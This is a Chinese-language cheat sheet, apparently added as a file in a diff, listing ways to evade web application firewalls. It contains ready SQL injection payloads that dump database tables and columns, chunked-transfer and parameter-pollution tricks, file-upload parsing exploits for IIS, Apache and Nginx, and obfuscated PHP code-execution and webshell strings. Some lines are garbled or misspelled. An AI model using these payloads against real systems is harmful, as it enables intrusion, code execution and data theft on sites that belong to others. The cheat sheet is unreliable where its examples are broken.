@@ -1,0 +1,242 @@
+对抗规则绕过:
+--> 对不同关键字进行不同编码绕过:
+select * from zzz == select * from %257a%257a%257a  #url 编码
+(单引号) == %u0027 %u02b9 %u02bc  #unicode 编码
+adminuser == 0x61646D696E75736572  #部分十六进制编码
+空格 == %20 %09 %0a %0b %0c %0d %a0  #各类编码
+
+--> 对关键字进行大小写转换:
+union select == UoIon SelECt
+
+--> 通关其他语义相同的关键字替换:
+and == &&
+or == ||
+=(等于) == like 或 < >  
+if(a,b,c) == case when(A) then B else C end
+substr(string,1,1) == substr(str) from 1 for 1
+limit 1,1 == limit 1 offset 1
+union select 1,2 == union select * from ((select 1)A jion (select 2)B)
+hex() bin() == ascii()
+sleep() == benchmark()
+concat_ws() == group_concat()
+mid() substr() == substring()
+@@user == user()
+@@datadir == datadir()
+
+--> 配合windows特性检测:
+whoami == ((((Wh^oa^m""i))))  #利用符号分割字符执行whoami
+
+whoami == 
+set a=net&set b=user&&call %a%%b%  #利用变量分割关键字执行whoami
+set a=WhO&set b=aMI&call %a%%b%   #whoami  ok
+
+set a=123whoami456   #设置变量a
+echo %a:~3,6%   #去除变量 a的第三位开始 一共6个字符
+%a:~3,6%   #执行取出的值  然后拼接执行命令 
+
+-->> linux 特性:
+whoami == w'h'o'a'm"i"   #单引号或双引号连接符   需要闭合
+whoami == /b[12345i]n/w[23sh]oa[2msh]i    #[]通配符
+whoami == a=who&&b=ami&&$a$b   #变量拼接
+
+-->> mysql 特性:
+user() == us/*123*/er/**/()  #注释
+user() == /*!user/*123*/()*/  #内联注释+注释
+union select == /*!union*//*123*//*!select*/  #注释组合
+union select == union#Ac%oaselect    #注释本行 AC   %0a换行 select   union select
+
+-->> 配合过滤合检测:
+user() == ususerer()   #双写绕过
+phpinfo() ==    chr (80).chr (72).chr (80).chr (73).chr (78).chr (70).chr (79).chr (40).chr (41)   #将acsii码通过chr()函数转换回来
+phpinfo == base_convert(27440799224,10,32)  #从10进制转换成32进制  通过base_convert() 转换关键字
+
+-->> HTTP 协议绕过:
+Content-Type: application/x-www-form-urlencoded è multipart/form-data
+#只会检测文件上传 而不会检测其他类型的攻击
+
+-->> HTTP请求方式绕过:
+waf在对危险字符进行检测的时候，分别为post请求和get请求设定了不同的匹配规则，请求被拦截，变换请求方式有几率能绕过检测
+Ps:云锁/安全狗安装后默认状态对post请求检测力度较小，可通过变换请求方式绕过
+
+-->> 参数污染绕过:
+提交的参数为：?id=1&id=2&id=exp
+asp.net+iis:id=1,2,exp
+asp+iis:id=1,2,exp
+php+apache:id=exp
+
+-->> 解析特性绕过:
+Iis5.0-6.0解析漏洞
+.asp --> /xx.asp/xx.jpg  #.asp，.asa目录下的文件都解析成asp文件
+.asp --> xx.asp;.jpg     #服务器默认不解析;号后面的内容
+
+Iis7.5解析漏洞(php.ini开启fix_pathinfo):
+.php --> /xx.jpg         #上传.jpg一句话，访问时后面加上/xx.php 
+
+apache解析漏洞:
+.php --> /test.php.php123     #从右往左，能别的后缀开始解析
+
+nginx解析漏洞(php.ini开启fix_pathinfo):
+.php --> xxx.jpg%00.php      #Nginx <8.03 空字节代码执行漏洞
+
+-->> 多Content-Disposition绕过:
+#请求包中包含多个Content-Disposition时，中间件与waf取值不同
+------------------------
+upload file 1  shell.php
+-------------------------
+#抓包 自己构造一个伪造上传 
+-------------------------
+upload file 2 shell.jpg
+-------------------------
+
+-->> 解析兼容性绕过:
+#在http协议中，标准的文件名的形式为filename=”1.php”,但是web容器会在解析协议时做一些兼容，文件上传时，有的waf只按照标准协议去解析，解析不到文件名，从而被绕过。
+filename="test.php  filename=test.php  filename=‘test.php‘
+
+-->> 分块传输绕过:
+原理:分块编码传输将关键字and,or,select ,union等关键字拆开编码，绕过waf等安全设备的检测，但无法绕过代码本身的检测。
+post /index.php
+Transfer-Encoding: chunked   #添加字段 表示分块传输数据
+
+3
+ip=
+6
+whoami
+0
+#0 的下面需要空两行 表示传输完毕
+ 
+-->> 修改编码方式：Charset绕过:
+原理:大部分的WAF默认用UTF8编码检测，修改编码方式可能会绕过waf，例如设置charset为ibm037
+
+-->> 参数溢出:
+原理:通过增加传递得参数数量，达到waf检测上限，超出的参数就可绕过waf了。可绕一些轻量级waf，如phpstudy自带waf。
+#设置拦截关键字
+?&var=test   #原本的
+?&var=test&var=test&var=test&var=test&var=test&var=test&var=payload   #多个参数 
+
+-->> 缓冲区溢出:
+原理:当服务器可以处理的数据量大于waf时，这种情况可以通过发送大量的垃圾数据将 WAF 溢出，从而绕过waf。
+UnIoN SeLeCT = and (select 1)=(Select 0xA*99999) UnIoN SeLeCT  
+and 1=1 = and 1=1 and 99…99999    #此处省略N多个9
+
+
+-->> 网络结构绕过:
+原理：不经过安全设备就不会拦截
+#源ip绕过
+原理：直接对源地址发起攻击，流量不会经过waf，从而成功绕过。
+#正常访问流量
+hacker --> waf --> server
+#直接访问server 源IP
+hacker --> server IP
+
+-->> 同网段/ssrf 绕过:
+原理： 利用ssrf内网访问  waf不会拦截来个内部的流量
+
+
+姿势一 规则对抗绕过  //  云锁和安全狗:
+原理:注释+换行绕过
+#既然如此，这里我们可以通过
+  1. 使用%23将后面的内容给注释掉
+  2. 使用%0a将后面的内容进行换行，使后面的sql语句逃出注释就能继续执行了
+#遇到关键函数被拦截，就在其中插入注释与换行。
+#在数据库中查询情况如下图所示
+
+#使用order by判断出存在2列
+Payload:test.php?id=1 /*!order*//**/%23A%0A/**/%23A%0A/*!by*//**/2
+
+#使用相同方法查询出用户名和数据库
+Payload:test.php?id=1 /*!UNIon*//**/%23A%0A/**/%23A%0A/*!select*//**/database(),user/**/()
+
+#知道当前数据库名称后，可以利用information_schema数据库获取当前数据库中存在的表。如下图所示
+Payload:test.php?id=1%20/*!UNIon*/%23A%0A/*!select*//**/database/**/(),group_concat(table_name)/**/%23A%0A/**/%23A%0A/*!from*//**/%23A%0Ainformation_schema.tables/**/%23A%0A/**/%23A%0Awhere%20table_schema=database/**/()
+
+#接下来就是列名与dump数据
+test.php?id=1 /*!UNIon*/%23A%0A/*!select*//**/database/**/(),group_concat(column_name)/**/%23A%0A/**/%23A%0A/*!from*//**/%23A%0Ainformation_schema.columns/**/%23A%0A/**/%23A%0Awhere table_name='users'
+
+
+姿势二 http协议绕过:
+#既然waf拦截组合，那我们通过分块传输将关键字分块
+#首先将请求方式变为post并抓包，修改数据包为分段传输格式
+#注意:这里Transfer-Encoding:的值设为x chunked而不是chunked
+#构造sql语句判断字段数
+post /test.php
+Transfer-Encoding: x chunked
+
+4
+id=1
+6
++order
+3
++by
+2
++2
+0
+
+
+#0 下面空两行  表示传输完毕
+
+payload={if:phpinfo()}{end if}
+keys={if:system(whoami)}{end if}
+
+fuzzing 一波当前语言常用的关键字  模糊测试
+burpsuite 发送关键字请求   查看返回
+
+#将phpinfo 从32进制转换为10进制
+#再通过php中的base_convert函数，再把10进制转为32进制，这样就能绕过waf与网站本身的检测，一箭双雕，构造好的poc如下
+array_map(base_convert(27440799224,10,32),array(1))  
+#通过构造好的poc，我们成功执行phpinfo命令
+
+{if:array_map(base_convert(591910,10,32),array(base_convert(831805,10,32).
+(base_convert(14,10,32)^base_convert(1,10,32)^base_convert(23,10,32)).
+(base_convert(25,10,32)^base_convert(1,10,32)^base_convert(23,10,32)).
+(base_convert(25,10,32)^base_convert(1,10,32)^base_convert(23,10,32)).(XX).
+(base_convert(26,10,32)^base_convert(1,10,32)^base_convert(23,10,32)).(XX).
+(base_convert(26,10,32)^base_convert(1,10,32)^base_convert(23,10,32)).(XX).
+(base_convert(26,10,32)^base_convert(1,10,32)^base_convert(23,10,32)).(XX).
+(base_convert(25,10,32)^base_convert(1,10,32)^base_convert(23,10,32)).
+(base_convert(1,10,32))),array((base_convert(1,10,32)).
+(base_convert(26,10,32)^base_convert(1,10,32)^base_convert(23,10,32)).
+(base_convert(33037,10,32))))}{end if}
+#一句话木马的转换形式
+
+
+--> php 函数绕过:
+preg_match('/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i',$code)  #主要绕过这个
+$blacklist = get_defined_functions()['internal'];
+
+#方式： 反向编码函数 phpinfo
+echo urlencode(~'phpinfo')  #==>> %8F%97%8F%96%91%99%90
+assert((~%8F%97%8F%96%91%99%90)())   #反向解码函数绕过
+
+exec('ls') ==>> (~%9A%87%9A%9C)(~%D8%93%8C%D8)
+system('ls')  ==>> (~%8C%86%8C%8B%9A%92)(~%D8%93%8C%D8)     #得到当前目录下文件
+#flag.php index.php   %D8   ' 单引号的反向编码
+
+system('cat flag.php')  ==>>  (~%8C%86%8C%8B%9A%92)(~%D8%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F%D8)
+#不能读取flag
+sytem((cat flag.php))  ==>>   (~%8C%86%8C%8B%9A%92)((~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F))
+#可以  
+
+readfile('flag.php') ==> readfile((flag)) ==>> (~%8D%9A%9E%9B%99%96%93%9A)((~%99%93%9E%98%D1%8F%97%8F))
+<?php ='ctfhub{513e02a64d67e9da5abeb949}';
+#把 ' '  替换成 ()
+
+
+--> php 函数弱类型判断:
+'asdfg' == 0  //true
+'0e23244' ==0   //true
+
+#这个函数存在一些奇异的地方，正则表达式$pattern以/e结尾时$replacement的值会被作为php函数执行。
+例如执行 preg_replace （‘/test/e’ ,  "phpinfo();" , "test" ）
+
+“test”会被替换为phpinfo();并执行。
+
+MD5比较绕过:
+#这儿md5(a)/md5(b)两数如果满足科学计数法的形式的话，php会将其当作科学计数法所得的数字来进行比较。例如：
+
+md5（QNKCDZO）
+md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。
+
+也就是说a[]=1,2 b[]=2,3 该验证依然可以绕过
+一般情况下诸如 1.php是无法上传上去的，但是此处可以通过 构造文件名为 1.<a>php绕过该验证。
+文件上传后不满足.php绕过过滤，但是在tp的原生上传函数被调用是<a>被去除，文件就会被以php格式上传。
+#注：此处的html可以为任意html标签。
